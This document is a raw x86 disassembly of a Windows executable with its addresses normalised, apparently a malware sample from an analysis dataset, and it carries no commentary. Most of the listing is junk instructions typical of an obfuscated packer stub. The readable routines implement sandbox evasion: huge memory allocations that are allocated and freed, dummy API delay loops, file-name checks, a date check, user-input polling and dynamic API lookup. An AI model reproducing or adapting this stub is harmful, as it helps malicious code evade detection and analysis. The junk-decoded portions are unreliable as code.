imul edx [ es : edx - 0x7b7b45a7 ] 0xffffffeb
jmp r-xdata
jmp r-xdata
push 0xeb7b7b7f
[ ebx ]
[ edx + 0x74ebebb8 ] esi
xchg edx eax
idiv [ ebp + 0x7a138484 ]
jpo r-xdata
push es
jmp r-xdata
sti
test [ edx + edx * 4 + 0x7b7b7050 ] al
jno r-xdata
mov ebp 0x84d56192
test bl ch
jmp r-xdata
jpo r-xdata
jmp r-xdata
sbb al 0x98
test [ ebx + ebp * 8 - 0x7b42086e ] al
test [ ebx ] dl
jpe r-xdata
jmp r-xdata
popfd
xchg esi eax
test [ esp + esi * 2 - 0x7b516b01 ] al
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
test bl ch
jmp r-xdata
jpo r-xdata
test [ edx + 0x7b7b7050 ] dl
sub_47c126
mov ch 0x84
test bl ch
jmp r-xdata
imul edx [ edx - 0x7b7b45a7 ] 0xffffffeb
xchg edx eax
idiv [ ebp + 0x7a138484 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
sti
test [ edx + edx * 4 + 0x7b7b7050 ] al
jno r-xdata
mov ebp 0x84d56192
test bl ch
jmp r-xdata
jpo r-xdata
jmp r-xdata
sbb al 0x98
test [ ebx + ebp * 8 - 0x7b42086e ] al
test [ ebx ] dl
jpe r-xdata
jmp r-xdata
popfd
xchg esi eax
test [ esp + esi * 2 - 0x7b516b01 ] al
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
push 0xeb7b7b7f
test bl ch
jmp r-xdata
jpo r-xdata
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
test [ edx + 0x7b7b7050 ] dl
adc edi [ edx + 0x7b ]
imul edx [ es : edx - 0x7b7b45a7 ] 0xffffffeb
sub_47c148
dec eax
mov ebx 0x84ad7e92
test bl ch
jmp r-xdata
mov [ edx - 0x7b7b6d6d ] edx
jmp r-xdata
adc edi [ ebx + 0x4b ]
jpo r-xdata
mov al 0x84
test bl ch
jmp r-xdata
xchg edx eax
or edx [ eax - 0xde27b7c ]
xchg edx eax
push 0xeb7b7b7f
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
sub_47c164
mov esp 0xbc928484
rol [ esp + eax * 4 + 0x59ff74eb ] 0x71
jpo r-xdata
xchg edx eax
popad
aad 0x84
xchg edx eax
jmp r-xdata
jno r-xdata
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
push 0xeb7b7b7f
test bl ch
jmp r-xdata
mov ebp 0x84d56192
jpo r-xdata
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
sbb al 0x98
test [ ebx + ebp * 8 - 0x7b42086e ] al
test [ ebx ] dl
jpe r-xdata
popfd
xchg esi eax
test [ esp + esi * 2 - 0x7b516b01 ] al
test bl ch
jmp r-xdata
jpo r-xdata
test [ edx + 0x7b7b7050 ] dl
adc edi [ edx + 0x7b ]
imul edx [ es : edx - 0x7b7b45a7 ] 0xffffffeb
jmp r-xdata
xchg edx eax
idiv [ ebp + 0x7a138484 ]
jpo r-xdata
jmp r-xdata
sti
jmp r-xdata
test [ edx + edx * 4 + 0x7b7b7050 ] al
sub_47c1b7
xchg ebx eax
and edx [ ecx ]
sbb bl [ 0xffffffff92913ef2 ]
js r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
cmc
jg r-xdata
xor esi 0x3e
[ 0xffffffff84a32992 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
push 0xeb7b7b7f
leave
[ edx - 0x7b7b385a ] edx
jmp r-xdata
clc
mov edi 0x973ef643
xchg edx eax
mov ecx 0xeb8484c9
and eax 0x7b7ff592
xchg edi eax
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
jmp r-xdata
xchg edx eax
fstp [ esi - 0x14147b7c ]
jmp r-xdata
sub dl [ ecx ]
cmp edx [ edx - 0x7b7b7a5a ]
jmp r-xdata
xchg edx eax
cdq
mov cl 0x84
test bl ch
jmp r-xdata
leave
les eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
sub_47c1ca
jmp r-xdata
jpo r-xdata
clc
mov edi 0x973ef643
sub esi eax
mov ebp 0x84d56192
test bl ch
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
[ edx - 0x7b7b385a ] edx
jmp r-xdata
xchg edx eax
mov ecx 0xeb8484c9
and eax 0x7b7ff592
jpo r-xdata
xchg edi eax
xchg ebp eax
and [ 0xffffffff928b26f2 ] bl
push 0xeb7b7b7f
xchg edx eax
fstp [ esi - 0x14147b7c ]
jmp r-xdata
dec eax
mov ebx 0x84aa2692
test bl ch
jmp r-xdata
leave
xchg edx eax
cdq
mov cl 0x84
test bl ch
jmp r-xdata
jmp r-xdata
sub dl [ ecx ]
cmp edx [ edx - 0x7b7b7a5a ]
jmp r-xdata
les eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
sub_47c2bb
adc [ esi ] ebx
and edx [ ecx ]
pop ss
sbb eax 0x238d3ef2
adc [ 0xffffffff833ef21d ] ebx
and edx [ ecx ]
push ebp
sbb eax 0x92813ef2
inc ebp
xchg esp eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
and [ ebx ] 0x11
sub_47c320
push cs
lahf
test [ ebx + 0x7b137f11 ] ch
dec ebx
jpo r-xdata
jmp r-xdata
xchg edx eax
fld [ ebp - 0x14147b7c ]
sbb eax 0x117b26f2
adc eax 0xf21da1f0
jns r-xdata
jpo r-xdata
idiv [ esi ]

sbb eax 0x117f26f2
dec ebp
and [ edx - 0x7b7b5547 ] dl
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc edi [ ebx - 0x5 ]
imul ebx [ 0x6292a9fe ] 0xffffffb2
adc [ ebx - 0x7c ] edi
maxps xmm3 [ ebx - 0x7c ]
sub eax 0xa10c920f
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
daa
adc [ edx ] edx
and [ ecx ] edx
adc eax 0x252ef21d
mov dl 0x84
test [ eax - 0x48 ] al
je r-xdata
and [ edx - 0x7b7b4677 ] edx
jmp r-xdata
sbb eax 0x11272ef2
adc ah [ ecx ]
adc [ 0x252ef21d ] edx
[ edi + eax * 8 - 0x72b77b7c ]
xchg edx eax
and bh [ esi - 0x14147b7c ]
jmp r-xdata
mov [ esp + eax * 4 + 0x22928d48 ] 0xeb8484be
jmp r-xdata
pushfd
test [ eax + eax * 2 - 0x63008b48 ] al
sub_47c35c
cmpsb [ esi ] [ edi ]
test [ esi + esi * 8 + 0x2d2bcb3e ] al
xchg edx eax
idiv [ esp + eax * 4 + 0x38ff7484 ]
test [ eax + esi * 8 - 0x7b9ca0c1 ] al
maxps xmm5 [ ebx + 0x78 ]
mov esp 0x84c46992
test bl ch
jmp r-xdata
les eax [ esp + eax * 4 + 0x635f3ff0 ]
test [ edi ] cl
pop edi
imul edi [ eax - 0x44 ] 0xffffff92
imul eax esp 0xebeb8484
jmp r-xdata
sub_47c3e1
out dx al
mov edx 0x9224baf0
into
mov [ 0x1deb8484 ] al
inc eax
jpe r-xdata
jmp r-xdata
sub cl [ ecx + 0x1deb8484 ]
push es
lea ebx [ 0x11272ef2 ]
adc ah [ ecx ]
adc [ 0x252ef21d ] edx
and [ edx - 0x7b7b4677 ] edx
jmp r-xdata
sbb eax 0x11272ef2
sub_47c410
sbb eax 0xfe1d6bf2
test eax 0x84b26292
[ edi + eax * 8 - 0x72b77b7c ]
xchg edx eax
and bh [ esi - 0x14147b7c ]
jmp r-xdata
pushfd
mov [ esp + eax * 4 + 0x22928d48 ] 0xeb8484be
jmp r-xdata
test [ eax + eax * 2 - 0x63008b48 ] al
test [ eax - 0x48 ] al
je r-xdata
mov dl 0x84
sub_47c437
or eax 0x9284848d
popfd
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
pushfd
mov dl 0x84
test [ eax - 0x48 ] al
je r-xdata
[ edi + eax * 8 - 0x72b77b7c ]
xchg edx eax
and bh [ esi - 0x14147b7c ]
jmp r-xdata
mov [ esp + eax * 4 + 0x22928d48 ] 0xeb8484be
jmp r-xdata
test [ eax + eax * 2 - 0x63008b48 ] al
sub_47c45a
mov ebx 0x849ece92
test bl ch
idiv [ esi ]
xchg ebx eax
sub esi eax
r-xdata
jmp r-xdata
cdq
xchg ebx eax
mov al [ 0x228484a8 ]
mov ebx 0xce38fe74
test [ esi + esi * 8 + 0x5592ab3e ] al
0x8484
sub_47c4ad
xchg edi eax
cli
mov [ 0xfffffffff0eb8484 ] eax
xchg edi eax
xchg edx eax
sub al 0x88
test [ eax + edi * 8 + 0x7b5f5f07 ] al
je r-xdata
adc [ eax ] ecx
and dl [ ecx ]
sbb dh al
mov edx 0x84931492
test bl ch
jmp r-xdata
call [ esi - 0x66 ]
test [ edx + edx * 4 - 0x7b7b7015 ] al
je r-xdata
push esi
0xeb928484 0x848f
test [ edi + edi * 8 - 0x6d ] dh
xchg edi eax
sub edi [ ecx + 0x7b ]
jpo r-xdata
call [ ebx - 0xf7b7b67 ]
jae r-xdata
cdq
test [ eax + esi * 8 - 0x4caf8cca ] al
xchg edx eax
xchg ebx eax
jmp r-xdata
pop eax
leave
test [ ebx + ebp * 8 - 0xf141415 ] al
mov ebx [ 0x25990ef2 ]
mov bl 0x92
test [ edx + 0x6 ] al
xchg [ edx - 0x7b7b497e ] edx
jmp r-xdata
test [ 0xffffffff873ef03f ] ch
xchg edx eax
idiv [ ebp + 0x6428484 ]
sub_47c55b
in eax dx
xlat
jpo r-xdata
ja r-xdata
jpo r-xdata
push cs
jae r-xdata
jmp r-xdata
cmp eax ebx
jpo r-xdata
jpo r-xdata
test bl ch
xchg edx eax
push ds
pop [ esp + eax * 4 - 0x7680f15 ]
xchg edi eax
jpo r-xdata
mov [ esp + eax * 4 - 0x7cc1bdde ] es
je r-xdata
and [ edx - 0x7b7b5a73 ] dl
jmp r-xdata
xchg edx eax
nop
0xebeb8484 0xebeb
adc [ esi ] ecx
sub edx [ edx - 0x7b7b6570 ]
jmp r-xdata
adc edi [ ebx + 0x4b ]
jpo r-xdata
cmp eax 0x928484b2
xor ch [ esp + eax * 4 - 0x1414147c ]
jmp sub_47c5b8
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
ja sub_47c519
test [ esp + esi * 2 + 0x2d286acc ] al
test [ ebx + ebp * 8 - 0x14141415 ] al
and edx [ ecx ]
push ds
xchg edx eax
loop sub_47c534
test [ eax + eax * 2 + 0x23927736 ] al
jl r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
sub_47c57d
test [ eax + 0x36 ] al
ja r-xdata
push cs
cdq
and eax 0xf21da5f0
lahf
and edi [ ebx + edi * 2 + 0x7b ]
jmp j_sub_47c560
adc [ eax + esi * 8 ] ebx
mov [ 0xffffffff9d26f21d ] eax
dec eax
mov al [ 0xffffffff84c8d492 ]
test bl ch
jmp r-xdata
lahf
sub_47c5e0
adc [ ebx + 0x2b ] edi
jpo r-xdata
mov [ esp + eax * 4 - 0x7cc1bdde ] es
je r-xdata
xchg edx eax
nop
0xebeb8484 0xebeb
adc [ esi ] ecx
and [ edx - 0x7b7b5a73 ] dl
jmp r-xdata
cmp eax 0x928484b2
xor ch [ esp + eax * 4 - 0x1414147c ]
jmp sub_47c5b8
sub_47c64f
sub eax 0x84bf4d92
test bl ch
jmp r-xdata
and dh dl
adc [ es : edx + 0x7b7b7dd3 ] 0xffffffeb
stosd [ edi ]
sub ebp [ eax ]
xchg edx eax
mov dl 0x97
test [ edx - 0x6d7cd90e ] al
sar [ ebp + 0x7b ] cl
jpo r-xdata
sub esi esi
jmp r-xdata
sub_47c67c
adc [ esi ] ebx
and ebx [ 0x118d3ef2 ]
or [ ebx ] esp
sbb eax 0x48833ef2
mov ebx 0x813ef21d
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x7b50726d ] al
test dh dh
cmpsd [ cs : esi ] [ edi ]
xchg edx eax
mov ecx 0xebeb8484
clc
mov ebp 0xc4c09279
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47c6c1
jmp r-xdata
test al dh
mov edi esi
lea edx [ edx - 0x7b7b3a75 ]
jmp r-xdata
xchg edx eax
ror [ edx - 0x216c7b7c ] 0x1
leave
test [ eax + esi * 8 - 0x6d720175 ] al
mov eax ebp
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg ebx eax
fmulp st1
sub_47c6c3
arpl [ ebx ] sp
adc [ esi ] edx
xchg edx eax
lodsb [ esi ]
rol [ esp + eax * 4 - 0x14141415 ] cl
jmp r-xdata
jmp r-xdata
leave
test [ eax + esi * 8 - 0x6d720175 ] al
mov eax ebp
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg ebx eax
fmulp st1
sub_47cb64
jmp r-xdata
in al dx
mov edx 0x18138484
pushfd
jo r-xdata
xor [ esp + eax * 4 - 0x1414147c ] 0xf0
mov [ 0xffffffffff74a0fe ] eax
xchg edx eax
jne r-xdata
push es
adc [ ecx ] 0x2d
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
not [ esi - 0x6d7b7c ]
aad 0x84
test bl ch
jmp r-xdata
[ 0x118306f2 ] 0x2d
sub_47cb7a
mov esp [ ebx ]
adc [ edx ] edx
xchg edx eax
int 0x8e
test [ ebx + ebp * 8 - 0x66d1415 ] al
lodsd [ esi ]
test [ esp + esi * 2 - 0x7b586202 ] al
test [ eax - 0x45 ] cl
and eax 0xebebb820
jmp r-xdata
jmp r-xdata
[ 0x118306f2 ] 0x2d
xchg edx eax
not [ esi - 0x6d7b7c ]
aad 0x84
test bl ch
jmp r-xdata
sub_47cbb2
xchg [ edx + 0x7b ] edi
jpo r-xdata
jmp r-xdata
[ 0xffffffff849aeb92 ] esp
test bl ch
jmp r-xdata
cli
mov esp 0x7b7b7bb1
idiv bh
pop edi
fstp [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
xchg edx eax
out dx al
cmpsb [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
test [ esi ] cl
xchg edi eax
xchg edx eax
mov edi 0xebeb8484
jmp r-xdata
jmp r-xdata
sub ebp eax
sub al 0xf2
cmp eax 0xb5e9934b
test [ edx + edx * 4 - 0x7b7b2e5b ] al
mov ebx 0xebb82025
jmp r-xdata
jmp r-xdata
jmp j_sub_47cb4d
sub_47cc00
test [ eax + edi * 8 + 0x7a675f07 ] al
je r-xdata
in al 0xa2
test [ eax + edi * 8 + 0x7a6f5f07 ] al
je r-xdata
shl [ esp + eax * 4 + 0x7a3cf684 ] cl
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edi edx
mov esp 0x7b7b7bb1
idiv bh
pop edi
fstp [ ecx + 0x7b ]
jpo r-xdata
xchg edx eax
out dx al
cmpsb [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0x14141415 ] al
test [ esi ] cl
xchg edi eax
xchg edx eax
mov edi 0xebeb8484
jmp r-xdata
sub ebp eax
sub al 0xf2
cmp eax 0xb5e9934b
test [ edx + edx * 4 - 0x7b7b2e5b ] al
sub_47cc77
dec [ eax - 0x55 ]
test [ esp + eax * 4 + 0x58929f0e ] al
stosd [ edi ]
test [ ebx + ebp * 8 - 0x2391d80d ] al
clc
test [ ebx + 0x74 ] ebx
stc
in eax dx
rol [ esp + eax * 4 - 0x778c17c ] cl
push es
xchg [ eax + 0x74 ] edi
stc
pushf
test [ ebx + esi * 8 - 0xe6d30c2 ] al
mov ah 0x84
test bl ch
jmp r-xdata
clc
sub_47ccbe
mov ebx 0xd8e0ff74
test [ ecx + edx - 0x28127b85 ] al
jmp r-xdata
jpo r-xdata
test ah cl
mov edi 0x937b7b7b
mov al [ 0xffffffff9b928484 ]
fwait
test [ ebx + ebp * 8 + 0x7b7a8f13 ] al
jpo r-xdata
mov bh 0x7b
jpo r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x2391d80d ] al
clc
test [ ebx + 0x74 ] ebx
stc
in eax dx
rol [ esp + eax * 4 - 0x778c17c ] cl
sbb al 0xcd
test [ ebp + ebx - 0x6d82c2c0 ] al
mov al 0xb2
test [ ebx + ebp * 8 - 0x32cf6d15 ] al
test [ esp + esi * 2 - 0x7b30ff02 ] al
test [ edx - 0x7b7b6cec ] dl
sub dl [ ebx - 0x7b7b4987 ]
je r-xdata
clc
mov edi 0x74bbfe6f
dec eax
add [ esp + eax * 4 - 0x7b3e646e ] 0xffffff84
jmp r-xdata
xchg edx eax
add eax 0xeb8484d8
jmp r-xdata
jmp r-xdata
mov bl 0x90
test [ eax + edi * 8 - 0x276d9041 ] al
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
xchg ebx eax
push es
xchg [ eax + 0x74 ] edi
stc
pushf
test [ ebx + esi * 8 - 0xe6d30c2 ] al
mov ah 0x84
test bl ch
jmp r-xdata
clc
test [ edx - 0x7b7b6465 ] dl
jmp r-xdata
cmp eax 0xa736927d
test [ ebx + ebp * 8 + 0x2b2c84eb ] al
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
test [ esi ] bh
xchg eax edi
test bl ch
jmp r-xdata
jpo r-xdata
add [ edx ] ch
call GetClassLongA
mov ebx 0x94749d7
daa
pop edi
test [ ebx ] dl
in eax 0xfb
jpo r-xdata
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1cd31055
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
cmp eax 0x928484c2
inc edx
retn 0x8484
outsd
je r-xdata
mov edi 0x5f274277
jpo r-xdata
xchg [ eax - 0x40077b7c ] eax
ja r-xdata
jpo r-xdata
in eax 0xfb
mov [ rw-data ] 0xba4e
xor ecx ecx
mov edx ebx
mov eax 0x1cd31055
call sub_47ce44
push 0x0
push 0x0
call GetClassLongA
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xa03f
jmp r-xdata
clc
mov edi 0x84d8926f
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
dec esp
mov dh 0x84
test [ edx - 0x7b7b436c ] dl
push 0x0
push 0x0
call GetClassLongA
dec ebx
jne r-xdata
push 0x0
call sub_476f80
nop
pop ebx
retn
test bl ch
jmp r-xdata
int3
sub_47cd24
mov ebx 0xca0fff74
test [ ecx + edx - 0x777b6d81 ] al
test [ ebx + ebp * 8 - 0x40337b15 ] al
test bl ch
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov bh 0x7b
jpo r-xdata
mov bl 0x90
test [ eax + edi * 8 - 0x276d9041 ] al
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
xchg [ eax - 0x40077b7c ] eax
ja r-xdata
in eax 0xfb
clc
mov edi 0x74bbfe6f
dec eax
add [ esp + eax * 4 - 0x7b3e646e ] 0xffffff84
jmp r-xdata
xchg edx eax
add eax 0xeb8484d8
jmp r-xdata
jpo r-xdata
add [ edx ] ch
call GetClassLongA
mov ebx 0x94749d7
daa
pop edi
outsd
je r-xdata
mov edi 0x5f274277
jpo r-xdata
jmp r-xdata
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jpo r-xdata
jmp r-xdata
xchg ebx eax
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1cd31055
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
cmp eax 0x928484c2
inc edx
retn 0x8484
clc
mov edi 0x84d8926f
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
dec esp
mov dh 0x84
test [ edx - 0x7b7b436c ] dl
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0xba4e
xor ecx ecx
mov edx ebx
mov eax 0x1cd31055
call sub_47ce44
push 0x0
push 0x0
call GetClassLongA
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xa03f
jmp r-xdata
test bl ch
jmp r-xdata
test ah cl
mov edi 0x937b7b7b
mov al [ 0xffffffff9b928484 ]
fwait
test [ ebx + ebp * 8 + 0x7b7a8f13 ] al
jpo r-xdata
xchg ebx eax
jpo r-xdata
push 0x0
push 0x0
call GetClassLongA
dec ebx
jne r-xdata
push 0x0
call sub_476f80
nop
pop ebx
retn
int3
test [ ebx + ebp * 8 - 0x2391d80d ] al
clc
test [ ebx + 0x74 ] ebx
stc
in eax dx
rol [ esp + eax * 4 - 0x778c17c ] cl
sbb al 0xcd
test [ ebp + ebx - 0x6d82c2c0 ] al
mov al 0xb2
test [ ebx + ebp * 8 - 0x32cf6d15 ] al
test [ esp + esi * 2 - 0x7b30ff02 ] al
test [ edx - 0x7b7b6cec ] dl
sub dl [ ebx - 0x7b7b4987 ]
je r-xdata
test [ ebx ] dl
jpo r-xdata
in eax 0xfb
push es
xchg [ eax + 0x74 ] edi
stc
pushf
test [ ebx + esi * 8 - 0xe6d30c2 ] al
mov ah 0x84
test bl ch
jmp r-xdata
clc
test [ edx - 0x7b7b6465 ] dl
jmp r-xdata
cmp eax 0xa736927d
test [ ebx + ebp * 8 + 0x2b2c84eb ] al
jmp r-xdata
test [ esi ] bh
xchg eax edi
sub_47cd97
test [ ebx + edx - 0x392f5f39 ] al
sub al 0xf2
lds edi [ edi - 0xd848485 ]
mov edi 0x5f274277
jpo r-xdata
cmp eax 0x928484c2
inc edx
retn 0x8484
clc
mov edi 0x84d8926f
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
dec esp
mov dh 0x84
test [ edx - 0x7b7b436c ] dl
jmp r-xdata
test bl ch
jmp r-xdata
jpo r-xdata
int3
xchg ebx eax
xchg [ eax - 0x40077b7c ] eax
ja r-xdata
jpo r-xdata
add [ edx ] ch
call GetClassLongA
mov ebx 0x94749d7
outsd
je r-xdata
daa
pop edi
test [ ebx ] dl
in eax 0xfb
jpo r-xdata
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1cd31055
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
mov [ rw-data ] 0xba4e
xor ecx ecx
mov edx ebx
mov eax 0x1cd31055
call sub_47ce44
push 0x0
push 0x0
call GetClassLongA
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xa03f
jmp r-xdata
push 0x0
push 0x0
call GetClassLongA
dec ebx
jne r-xdata
push 0x0
call sub_476f80
nop
pop ebx
retn
sub_47ce44
push ebx
test eax eax
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
mov [ ebx ] 0xe3
nop
nop
inc ecx
dec eax
jne r-xdata
call sub_403174
nop
mov ebx ecx
nop
add ebx edx
jae r-xdata
sub_47ce68
push ebx
push 0x0
push 0x0
call GetClassLongA
mov ebx 0x94749d7
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1cd31055
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
mov [ rw-data ] 0xba4e
xor ecx ecx
mov edx ebx
mov eax 0x1cd31055
call sub_47ce44
push 0x0
push 0x0
call GetClassLongA
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0xa03f
jmp r-xdata
push 0x0
push 0x0
call GetClassLongA
dec ebx
jne r-xdata
push 0x0
call sub_476f80
nop
pop ebx
retn
sub_47cee4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cf09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cf10
retn
sub_47cf14
push ebx
push esi
push edi
mov edi rw-data
sub [ rw-data ] 0x1
jae r-xdata
pop edi
pop esi
pop ebx
retn
push 0xff
push rw-data
push 0x0
call GetModuleFileNameA
cmp [ rw-data ] 0x43
jne r-xdata
mov ebx 0x1708
cmp [ rw-data ] 0x53
jne r-xdata
push 0x0
push 0x0
call GetClassLongA
dec ebx
jne r-xdata
push 0x0
push 0x0
call GetClassLongA
mov ebx 0x248cb
cmp [ rw-data ] 0x4c
jne r-xdata
push 0x0
push 0x0
call GetClassLongA
nop
nop
dec ebx
jne r-xdata
nop
push 0x4
push 0x3000
push 0x2a037a77
push 0x0
call VirtualAlloc
mov ebx eax
nop
nop
test ebx ebx
jne r-xdata
cmp [ rw-data ] 0x46
je r-xdata
nop
nop
xor ecx ecx
mov edx ebx
mov eax 0x2a037a77
call sub_47ce44
nop
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
push 0x0
push 0x0
push 0x0
call SelectPalette
call GetLastError
cmp eax 0x6
je r-xdata
jmp r-xdata
mov ebx 0x8f2c
jmp r-xdata
nop
nop
push 0x0
push 0x0
call GetClassLongA
nop
dec ebx
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
nop
jmp r-xdata
nop
nop
xor ebx ebx
xor esi esi
push 0x0
push 0x0
call GetClassLongA
cmp eax 0x18b
jbe r-xdata
call sub_403174
cmp ebx 0x2
jle r-xdata
add ebx 0x1
jno r-xdata
push 0x0
push 0xf6
call SleepEx
jmp r-xdata
call sub_47ce68
jmp r-xdata
push 0x0
push 0x0
call GetClassLongA
mov esi [ edi + 0x4 ]
nop
nop
call sub_403174
mov [ edi ] 0x8
nop
xor eax eax
mov [ edi + 0x4 ] eax
nop
push edi
call GetLastInputInfo
mov eax [ edi + 0x4 ]
sub eax esi
jae r-xdata
push 0x0
push 0x0
call GetClassLongA
sub_47d0e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47d107
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d10e
retn
sub_47d110
add [ eax ] al
add [ eax ] bl
rol [ edi ] 0x1
sub [ edx + 0x40 ] ah
add al bh
popad
inc eax
add [ eax ] bl
inc eax
add al cl
pop edi
inc eax
add [ eax + 0x70004062 ] ah
bound eax [ eax ]
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_47d110
call sub_4061b4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4626a0
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4626b8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462738
call sub_403e94
sub_4012ec
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40130c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401334
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401344
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40134c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40136c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_401384
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_40138c
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4013ac
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_4013c4
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
sub_4013cc
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_4013d4
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4013dc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_4013ec
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401410
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401428
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401430
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401438
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401440
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401448
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b92
jmp sub_403988
sub_401b99
mov al [ rw-data ]
pop ebp
retn
sub_401c76
jmp sub_403988
sub_401d44
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402358
retn
sub_402344
jmp sub_403988
